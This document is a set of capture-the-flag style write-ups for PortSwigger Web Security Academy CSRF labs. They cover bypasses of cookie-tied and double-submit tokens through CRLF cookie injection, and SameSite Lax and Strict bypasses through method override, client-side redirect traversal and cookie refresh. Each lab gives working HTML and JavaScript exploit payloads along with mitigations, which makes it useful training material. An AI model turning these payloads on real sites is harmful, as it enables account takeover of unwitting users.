# 5th lab

#  Lab: CSRF where token is tied to non-session cookie
**Platform:** PortSwigger Web Security Academy
**Goal:** Use the exploit server to change the victim's email address.
**Vulnerability:** CSRF via Broken Anti-CSRF Implementation + HTTP Header (CRLF) Injection.

##  The Concept
The application uses a double-submit or decoupled token mechanism. It validates the hidden `csrf` token against a separate `csrfKey` cookie, rather than tying the CSRF token directly to the user's `session` cookie. 
Because the application does not verify if the `csrfKey` cookie actually belongs to the current authenticated user, an attacker can exploit this if they find a way to inject a known `csrfKey` cookie into the victim's browser. Once the known cookie is planted, the attacker can submit a CSRF form containing the matching `csrf` token, bypassing the protection.

## Prerequisites
* A valid `csrfKey` cookie and a matching `csrf` token (obtained by logging into your own attacker account).
* A vulnerability on the target site that allows setting arbitrary cookies in the victim's browser (e.g., CRLF injection in a search parameter).

##  Step-by-Step Exploitation

### Step 1: Harvest Valid Tokens
1. Log in to the application with standard credentials (`wiener:peter`).
2. Observe the HTTP traffic in Burp Suite.
3. Note the value of the `csrfKey` cookie from any authenticated request.
4. Intercept the submission of the "Update email" form and note the value of the hidden `csrf` parameter in the body.

### Step 2: Identify Cookie Injection (CRLF)
1. Use the search functionality on the site (e.g., `/?search=test`).
2. Observe the response: `Set-Cookie: LastSearchTerm=test`.
3. Verify CRLF injection by adding `%0d%0a` to the search term to append a new header:
   `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None`

### Step 3: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that first forces the victim's browser to execute the CRLF injection (planting the cookie) and then immediately submits the CSRF form.
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
       <input type="hidden" name="email" value="hacker@evil.com">
       <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
   </form>
   <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRF_KEY%3b%20SameSite=None)" onerror="document.forms[0].submit();">
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved!

**Key Takeaway / Mitigation**: Anti-CSRF tokens must be strictly cryptographically tied to the user's active session identifier (e.g., the session cookie) on the server side. Additionally, applications must sanitize all user inputs reflected in HTTP headers to prevent CRLF injectio


# 6th lab

#  Lab: CSRF where token is duplicated in cookie
**Platform:** PortSwigger Web Security Academy
**Goal:** Use the exploit server to change the victim's email address.
**Vulnerability:** CSRF via Flawed Double Submit Cookie Implementation + CRLF Injection.

##  The Concept
The application implements the "Double Submit Cookie" pattern for CSRF protection. It expects the CSRF token to be present in both a cookie and a hidden form field. 
However, the application only checks if the value in the cookie matches the value in the form parameter. It does not validate if the token is cryptographically valid or legally issued by the server. If an attacker can inject an arbitrary cookie into the victim's browser, they can simply invent a fake token, inject it via the cookie, and submit a CSRF payload containing the exact same fake token in the body.

##  Prerequisites
* A vulnerability that allows setting arbitrary cookies in the victim's browser (e.g., CRLF injection via a reflected search parameter).

##  Step-by-Step Exploitation

### Step 1: Identify Cookie Injection (CRLF)
1. Use the search functionality on the site.
2. Observe the HTTP response setting a tracking cookie: `Set-Cookie: LastSearchTerm=test`.
3. Verify CRLF injection by injecting a new line (`%0d%0a`) into the search term to append a malicious CSRF cookie:
   `/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None`

### Step 2: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that first forces the victim's browser to execute the CRLF injection (planting the `fake123` cookie) and then immediately submits the CSRF form with the matching `fake123` token.
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
       <input type="hidden" name="email" value="hacker@evil.com">
       <input type="hidden" name="csrf" value="fake123">
   </form>
   <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None)" onerror="document.forms[0].submit();">
   ```
3. click the store and then deliver the exploit to victim
4. The lab is successfully solved

**key Takeaway**:The Double Submit Cookie pattern is inherently fragile if any subdomain or functional endpoint on the architecture has a cookie injection vulnerability. Servers should implement strict validation, tying the CSRF token cryptographically to the server-side session, rather than blindly comparing two client-provided values. 


# 7th lab


#  Lab: SameSite Lax bypass via method override
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass `SameSite=Lax` restrictions to change the victim's email address using an exploit server.
**Vulnerability:** CSRF via HTTP Method Overriding bypassing SameSite=Lax cookie restrictions.

##  The Concept
Modern browsers enforce `SameSite=Lax` by default on cookies. This prevents cookies from being sent in cross-site `POST` requests, effectively mitigating standard CSRF attacks. However, `Lax` allows cookies to be sent during top-level navigations using safe HTTP methods like `GET`.
Many web frameworks support **HTTP Method Overriding** (e.g., using a `_method` parameter) to simulate unsupported HTTP methods. If a backend framework allows simulating a `POST` request via a `GET` request parameter (like `?_method=POST`), an attacker can force the victim's browser to make a top-level `GET` navigation. The browser includes the `Lax` cookie because it's a `GET` request, and the backend processes it as a state-changing `POST` request, bypassing the CSRF protection.

##  Prerequisites
* A target endpoint that performs state-changing actions via `POST`.
* A backend framework that supports HTTP Method Overriding via URL parameters (e.g., `_method=POST`).

##  Step-by-Step Exploitation

### Step 1: Verify Method Overriding
1. Capture a legitimate `POST` request to the target endpoint (e.g., `/my-account/change-email`).
2. Send the request to Burp Repeater.
3. Change the request method to `GET` and append the required parameters along with `_method=POST` to the URL.
   `GET /my-account/change-email?email=hacker@evil.com&_method=POST HTTP/2`
4. Send the request and verify if the action was successfully executed (e.g., receiving a `302 Found` redirecting back to the account page).

### Step 2: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft a simple HTML page with JavaScript that forces a top-level `GET` navigation to the vulnerable endpoint. This ensures the browser attaches the `SameSite=Lax` cookie.
   ```html
   <script>
       document.location = "[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=hacker@evil.com&_method=POST](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=hacker@evil.com&_method=POST)";
   </script>
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved!

**Key Takeaway / Mitigation**: Never allow state-changing operations to be executed via GET requests, even through framework features like Method Overriding. Backend systems should strictly enforce HTTP verbs and reject requests where the actual transport method (GET) contradicts the intended functional method (POST).

# 8th lab

#  Lab: SameSite Strict bypass via client-side redirect
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass `SameSite=Strict` restrictions to change the victim's email address using a client-side redirect vulnerability.
**Vulnerability:** CSRF bypassing SameSite=Strict + Client-Side Open Redirect + Improper Method Validation.

## The Concept (The "Trojan Horse" Bypass)
The `SameSite=Strict` cookie attribute instructs the browser to never send the cookie in cross-site requests, effectively blocking standard CSRF attacks regardless of the HTTP method. 
However, if an attacker can find a client-side redirect vulnerability (where JavaScript on the target site reads a URL parameter and redirects the user via `window.location`), they can use the target application as a proxy. The attacker induces the victim to visit the vulnerable redirect endpoint. The initial cross-site request is sent without cookies. But when the target site's own JavaScript executes the redirect to the sensitive endpoint, the browser considers this a same-site navigation initiated by the application itself, and attaches the `Strict` cookies.

##  Prerequisites
* A sensitive state-changing endpoint that accepts `GET` requests (either directly or via method overriding).
* A client-side redirect vulnerability on the same domain that allows controlling the redirect destination path.

##  Step-by-Step Exploitation

### Step 1: Identify the Gadget (Client-Side Redirect)
1. Post a comment on any blog post and observe the redirection flow. 
2. The user is sent to `/post/comment/confirmation?postId=x`, which waits a few seconds and uses JavaScript to redirect the user to `/post/x`.
3. This is a client-side redirect where the destination is dynamically constructed from the `postId` query parameter.

### Step 2: Craft the Traversal Payload
1. We must redirect the user to the email change endpoint: `/my-account/change-email?email=hacker@evil.com&submit=1`.
2. By using directory traversal in the `postId` parameter, we can escape the `/post/` directory constraint:
   `1/../../my-account/change-email?email=hacker@evil.com%26submit=1`
   *(Note: The `&` character must be URL-encoded as `%26` so it isn't parsed as a separate parameter for the initial confirmation endpoint).*

### Step 3: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML page with JavaScript that forces the victim's browser to navigate to the vulnerable confirmation endpoint containing our traversal payload.
   ```html
   <script>
       document.location = "[https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker@evil.com%26submit=1](https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker@evil.com%26submit=1)";
   </script>
   ```
3. Click Store and then Deliver exploit to victim.

4. The lab is successfully solved! 

**Key Takeaway / Mitigation**: To mitigate this, developers must properly sanitize inputs used in client-side redirects (preventing path traversal). More importantly, sensitive state-changing actions must never accept GET requests, rendering client-side GET redirects useless for CSRF.


# 7th lab

#  Lab: SameSite Lax bypass via cookie refresh
**Platform:** PortSwigger Web Security Academy
**Goal:** Bypass `SameSite=Lax` restrictions to change the victim's email address by exploiting the browser's 2-minute cookie age exception.
**Vulnerability:** CSRF bypassing SameSite=Lax via Cookie Refresh (Browser quirk/exception).

## The Concept (The 2-Minute Window)
By default, modern browsers enforce `SameSite=Lax` on cookies, preventing them from being sent in cross-site `POST` requests. However, to prevent breaking Single Sign-On (SSO) mechanisms (like OAuth/SAML) where the Identity Provider redirects the user back to the application via a cross-site POST request, browsers like Chrome introduced a temporary exception: 
**If a cookie is less than 2 minutes old, the browser will NOT enforce the `Lax` restriction on top-level cross-site `POST` requests.** If an application has an endpoint (like `/social-login`) that refreshes the session cookie without requiring user interaction (if they are already authenticated), an attacker can force the victim to visit this endpoint to get a "fresh" cookie. Within the next 2 minutes, the attacker can successfully execute a standard cross-site CSRF `POST` attack, and the browser will attach the session cookie.

##  Prerequisites
* A target endpoint vulnerable to CSRF via `POST`.
* An endpoint that refreshes/re-issues the user's session cookie without requiring interaction (e.g., an OAuth `/social-login` flow that auto-redirects authenticated users).
* The ability to open pop-ups or trigger top-level navigations from the exploit server.

## Step-by-Step Exploitation

### Step 1: Identify the Refresh Endpoint
1. Observe the application's login flow.
2. Note that clicking "Social login" (or similar) hits an endpoint like `/social-login` and assigns a newly minted session cookie upon redirection back to the site.

### Step 2: Build the Exploit
1. Navigate to the Exploit Server.
2. Craft an HTML payload that performs two actions:
   * First, it opens a new window/tab to the cookie refresh endpoint (`/social-login`). This gives the victim a fresh cookie (age < 2 minutes).
   * Second, it waits for a short duration (e.g., 5 seconds to ensure the new cookie is set) and then auto-submits a CSRF `POST` form to the sensitive endpoint.
3. **Payload:**
   ```html
   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST" id="csrf-form">
       <input type="hidden" name="email" value="hacker@evil.com">
   </form>

   <script>
       // Trigger top-level navigation to refresh the session cookie
       window.open('[https://YOUR-LAB-ID.web-security-academy.net/social-login](https://YOUR-LAB-ID.web-security-academy.net/social-login)', 'refresh_window');

       // Wait 5 seconds for the cookie to be refreshed, then fire the POST request
       setTimeout(function() {
           document.getElementById('csrf-form').submit();
       }, 5000);
   </script>
   ```

### Step 3: Execute the Takedown
1. Click Store and then Deliver exploit to victim.

2. The victim bot visits the exploit, the popup refreshes their cookie, and 5 seconds later, the CSRF payload executes successfully within the 2-minute exception window.

3. The lab is successfully solved! 

**Key Takeaway / Mitigation**: This highlights why SameSite attributes are a "defense-in-depth" mechanism, not a silver bullet. Browsers have quirks and exceptions. Applications must still implement robust, cryptographically secure Anti-CSRF tokens for all state-changing operations, regardless of cookie attributes.